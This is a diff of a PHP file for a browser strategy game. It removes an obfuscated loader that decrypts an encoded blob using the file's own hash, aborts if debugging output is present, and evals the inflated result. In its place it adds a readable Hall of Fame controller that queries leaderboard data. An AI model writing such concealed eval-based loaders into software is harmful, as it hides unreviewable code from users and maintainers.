@@ -1,24 +1,244 @@
 <?php
-$gprwuv="546f03d78dd762da91479ddec79f6409";
-$axfrupidet="0306020353525c0f0a5457540157020508020c535b535d0755010d56060d010c";
-$dufskzjizt="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";
-$grfoginqt=file_get_contents(__FILE__);
-$zmzsqjizvm=str_replace($dufskzjizt,"",$grfoginqt);
-if(strpos($zmzsqjizvm,"ec"."ho")!==false||strpos($zmzsqjizvm,"pr"."int")!==false||strpos($zmzsqjizvm,"var_"."dump")!==false||strpos($zmzsqjizvm,"file_put_"."contents")!==false||strpos($zmzsqjizvm,"fw"."rite")!==false){die();}
-$rchaymkwww=str_replace(array($gprwuv,$axfrupidet),array("SP_ddb12193","KP_ade8ac71"),$grfoginqt);
-$slwkxfzfng=md5($rchaymkwww);
-$yusfmikqkadg=hex2bin($axfrupidet);
-$dypzgp="";
-$iioliljrluj=strlen($slwkxfzfng);
-for($mrtppcnxwq=0;$mrtppcnxwq<$iioliljrluj;$mrtppcnxwq++){
-    $dypzgp.=chr(ord($yusfmikqkadg[$mrtppcnxwq])^ord($slwkxfzfng[$mrtppcnxwq]));
+namespace App\Controllers\Screens;
+
+class HallOfFameScreen
+{
+    private $db;
+    private $world;
+    private $worldConfig;
+
+    public function __construct($world = '1')
+    {
+        require_once __DIR__ . '/../../Core/LanguageManager.php';
+        require_once __DIR__ . '/../../Helpers/language_helper.php';
+        \init_locale();
+
+        $this->world = $world;
+        $this->loadWorldConfig();
+        $this->connectToWorld();
+    }
+
+    private function loadWorldConfig()
+    {
+        $worldConfigPath = __DIR__ . '/../../Config/Worlds/' . $this->world . '.php';
+        
+        if (!file_exists($worldConfigPath)) {
+            die("World config file not found: " . $worldConfigPath);
+        }
+
+        $this->worldConfig = include $worldConfigPath;
+        
+        if (!is_array($this->worldConfig)) {
+            die("Invalid world config format in: " . $worldConfigPath);
+        }
+    }
+
+    private function connectToWorld()
+    {
+        // Usar credenciais do ficheiro do mundo específico
+        $dbHost = $this->worldConfig['db_host'] ?? null;
+        $dbUser = $this->worldConfig['db_user'] ?? null;
+        $dbPass = $this->worldConfig['db_pw'] ?? $this->worldConfig['db_pass'] ?? null;
+        $dbName = $this->worldConfig['db_name'] ?? null;
+
+        if (!$dbHost || !$dbUser || !$dbName) {
+            die("Missing database configuration in world config file for world: " . $this->world);
+        }
+
+        $this->db = @\mysqli_connect($dbHost, $dbUser, $dbPass, $dbName);
+
+        if (!$this->db) {
+            die("Erro ao conectar ao mundo " . $this->world . " (BD: $dbName): " . \mysqli_connect_error());
+        }
+        
+        \mysqli_set_charset($this->db, 'utf8');
+        \mysqli_query($this->db, "SET SESSION sql_mode = ''") or die(\mysqli_error($this->db));
+    }
+
+    public function render()
+    {
+        $data = $this->getHallOfFameData();
+        $data['world'] = $this->world;
+        $data['worlds_list'] = $this->getWorldsList();
+        return $this->renderView($data);
+    }
+
+private function getWorldsList()
+{
+    $worlds_list = [];
+    $worldsDir = __DIR__ . '/../../Config/Worlds';
+    
+    if (is_dir($worldsDir)) {
+        $files = scandir($worldsDir);
+        foreach ($files as $file) {
+            // Aceita: 1.php, 2.php, classico1.php, etc.
+            if (preg_match('/^([a-zA-Z]*\d+)\.php$/', $file, $matches)) {
+                $worldId = $matches[1]; // "1", "classico1", "mundo2", etc.
+                
+                // Extrair apenas o número para ordenação
+                preg_match('/\d+/', $worldId, $numMatch);
+                $sortNum = isset($numMatch[0]) ? (int)$numMatch[0] : 0;
+                
+                $worldConfig = include $worldsDir . '/' . $file;
+                $isClosed = isset($worldConfig['is_closed']) && $worldConfig['is_closed'] == true;
+                
+                // Nome amigável para exibição
+                if (preg_match('/^([a-zA-Z]+)(\d+)$/', $worldId, $nameMatch)) {
+                    $prefix = ucfirst($nameMatch[1]);
+                    $number = $nameMatch[2];
+                    $worldName = "$prefix $number";
+                } else {
+                    $worldName = "Mundo $worldId";
+                }
+                
+                $worlds_list[] = [
+                    "id" => $worldId, 
+                    "name" => $worldName, 
+                    "is_closed" => $isClosed,
+                    "sort_num" => $sortNum
+                ];
+            }
+        }
+        
+        usort($worlds_list, function ($a, $b) {
+            return $a['sort_num'] - $b['sort_num'];
+        });
+    }
+    return $worlds_list;
 }
-$zyhbsxt=base64_decode($dufskzjizt);
-$hgruajenkz=strlen($zyhbsxt);
-$wmgzvervg="";
-$bwzeazoopk=strlen($dypzgp);
-for($mrtppcnxwq=0;$mrtppcnxwq<$hgruajenkz;$mrtppcnxwq++){
-    $wmgzvervg.=$zyhbsxt[$mrtppcnxwq]^$dypzgp[$mrtppcnxwq%$bwzeazoopk];
+
+    private function getHallOfFameData()
+    {
+        $data = [];
+
+        $result = \mysqli_query($this->db, "SELECT id, username, points FROM users ORDER BY points DESC LIMIT 3");
+        $data['top_players'] = [];
+        if ($result) {
+            while ($row = \mysqli_fetch_assoc($result)) {
+                $data['top_players'][] = $row;
+            }
+        }
+
+        $result = \mysqli_query($this->db, "SELECT id, `short`, `name`, points FROM ally ORDER BY points DESC LIMIT 1");
+        $topTribe = $result ? \mysqli_fetch_assoc($result) : null;
+
+        if ($topTribe) {
+            $data['top_tribe'] = $topTribe;
+            $data['top_tribe']['tag'] = $topTribe['short'];
+
+            $tribeId = $topTribe['id'];
+            $resMembers = \mysqli_query($this->db, "SELECT username FROM users WHERE ally = '$tribeId' LIMIT 50");
+            $members = [];
+            if ($resMembers) {
+                while ($m = \mysqli_fetch_assoc($resMembers)) {
+                    $members[] = $m['username'];
+                }
+            }
+            $data['top_tribe']['members'] = implode(', ', $members);
+        } else {
+            $data['top_tribe'] = null;
+        }
+
+        $data['achievements'] = [];
+
+        $resVillas = \mysqli_query($this->db, "SELECT username, villages FROM users ORDER BY villages DESC LIMIT 1");
+        $topVillas = $resVillas ? \mysqli_fetch_assoc($resVillas) : null;
+        $data['achievements']['conqueror'] = [
+            'title' => \__('screens.hall_of_fame.conqueror'),
+            'items' => [
+                '100_villages' => [
+                    'label' => \__('screens.hall_of_fame.has_villages_first', ['count' => 100]),
+                    'winner' => ($topVillas && $topVillas['villages'] >= 100) ? $topVillas['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_podbicia.png'
+                ],
+                '2_villages' => [
+                    'label' => \__('screens.hall_of_fame.has_villages_first', ['count' => 2]),
+                    'winner' => ($topVillas && $topVillas['villages'] >= 2) ? $topVillas['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_podbicia.png'
+                ]
+            ]
+        ];
+
+        $topPoints = $data['top_players'][0] ?? null;
+        $data['achievements']['champion'] = [
+            'title' => \__('screens.hall_of_fame.points_champion'),
+            'items' => [
+                '10k_points' => [
+                    'label' => \__('screens.hall_of_fame.reached_points_first', ['points' => '10.000']),
+                    'winner' => ($topPoints && $topPoints['points'] >= 10000) ? $topPoints['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_punkty.png'
+                ]
+            ]
+        ];
+
+        $resODA = \mysqli_query($this->db, "SELECT username, killed_units_att FROM users ORDER BY killed_units_att DESC LIMIT 1");
+        $topODA = $resODA ? \mysqli_fetch_assoc($resODA) : null;
+        $data['achievements']['battle_lord'] = [
+            'title' => \__('screens.hall_of_fame.battlefield_master'),
+            'items' => [
+                '10k_kills' => [
+                    'label' => \__('screens.hall_of_fame.defeated_units_first', ['count' => '10.000']),
+                    'winner' => ($topODA && $topODA['killed_units_att'] >= 10000) ? $topODA['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_zabite_jednostki.png'
+                ]
+            ]
+        ];
+
+        $resCoins = \mysqli_query($this->db, "SELECT username, snob_coins FROM users ORDER BY snob_coins DESC LIMIT 1");
+        $topCoins = $resCoins ? \mysqli_fetch_assoc($resCoins) : null;
+        $data['achievements']['gold_rush'] = [
+            'title' => \__('screens.awards.names.odznaczenie_monety'),
+            'items' => [
+                '500_coins' => [
+                    'label' => \__('screens.hall_of_fame.reached_points_first', ['points' => '500 moedas']),
+                    'winner' => ($topCoins && $topCoins['snob_coins'] >= 500) ? $topCoins['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_monety.png'
+                ]
+            ]
+        ];
+
+        $resLoot = \mysqli_query($this->db, "SELECT username, zlupione_sur FROM users ORDER BY zlupione_sur DESC LIMIT 1");
+        $topLoot = $resLoot ? \mysqli_fetch_assoc($resLoot) : null;
+        $data['achievements']['looter'] = [
+            'title' => \__('screens.awards.names.odznaczenie_lupy'),
+            'items' => [
+                '1m_loot' => [
+                    'label' => \__('screens.hall_of_fame.reached_points_first', ['points' => '1.000.000']),
+                    'winner' => ($topLoot && $topLoot['zlupione_sur'] >= 1000000) ? $topLoot['username'] : \__('screens.hall_of_fame.nobody_yet'),
+                    'image' => '/graphic/awards/odznaczenie_lupy.png'
+                ]
+            ]
+        ];
+
+        $data['daily_awards'] = [
+            'attacker' => ['name' => \__('screens.hall_of_fame.best_attacker'), 'winner' => \__('screens.hall_of_fame.nobody_yet'), 'image' => '/graphic/awards/day_att_kill.png'],
+            'defender' => ['name' => \__('screens.hall_of_fame.best_defender'), 'winner' => \__('screens.hall_of_fame.nobody_yet'), 'image' => '/graphic/awards/day_def_kill.png'],
+            'plunderer' => ['name' => \__('screens.hall_of_fame.best_raider'), 'winner' => \__('screens.hall_of_fame.nobody_yet'), 'image' => '/graphic/awards/day_farmed_vills.png'],
+            'farmer' => ['name' => \__('screens.hall_of_fame.best_looter'), 'winner' => \__('screens.hall_of_fame.nobody_yet'), 'image' => '/graphic/awards/day_lupy.png']
+        ];
+
+        return $data;
+    }
+
+    private function renderView($data)
+    {
+        extract($data);
+        
+        global $conf;
+        if (empty($conf)) {
+            require __DIR__ . '/../../../public/configs/config.php';
+        }
+        $theme = $conf['index_theme'] ?? 'classic';
+        $viewFile = $theme == 'modern' ? 'hall_of_fame_modern.php' : 'hall_of_fame_classic.php';
+        
+        $viewPath = __DIR__ . '/../../Views/screens/' . $viewFile;
+        
+        if (!file_exists($viewPath)) {
+            die("View file not found: " . $viewPath);
+        }
+        
+        ob_start();
+        include $viewPath;
+        return ob_get_clean();
+    }
 }
-$ospfdiqct="gz"."in"."fl"."ate";
-eval($ospfdiqct($wmgzvervg));
